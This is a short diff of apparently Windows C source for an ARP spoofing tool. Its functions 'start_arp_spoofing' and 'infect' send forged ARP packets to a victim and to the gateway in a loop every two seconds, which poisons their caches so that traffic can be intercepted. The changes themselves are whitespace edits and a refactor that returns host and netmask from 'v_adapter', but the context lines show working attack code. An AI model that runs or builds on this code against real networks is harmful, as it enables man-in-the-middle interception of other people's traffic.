@@ -52,7 +52,7 @@ static DWORD WINAPI start_arp_spoofing(
 		infect_params.victim_mac,
 		2
 	);
-
+	
 	build_packet(
 		gateway_packet,
 		htonl(infect_params.victim_ip),
@@ -62,12 +62,14 @@ static DWORD WINAPI start_arp_spoofing(
 		2
 	);
 
+	
 	while (!finished_infecting)
 	{
 		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
 		Sleep(2000);
 	}
+
 	finished_infecting = 0;
 	return 0;
 }
@@ -228,7 +230,7 @@ void infect()
 {
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
-	uint32_t netmask;
+	uint32_t host, netmask;
 
 	pcap_t* fp;
 	pcap_if_t* alldevs = NULL, * adapter;
@@ -257,7 +259,7 @@ void infect()
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 
 	/* find the corresponding adapter to the victim */
-	netmask = v_adapter(alldevs, &adapter, infect_params.victim_ip);
+	v_adapter(alldevs, &adapter, infect_params.victim_ip, &host, &netmask);
 	if (adapter == NULL)
 		return;
 
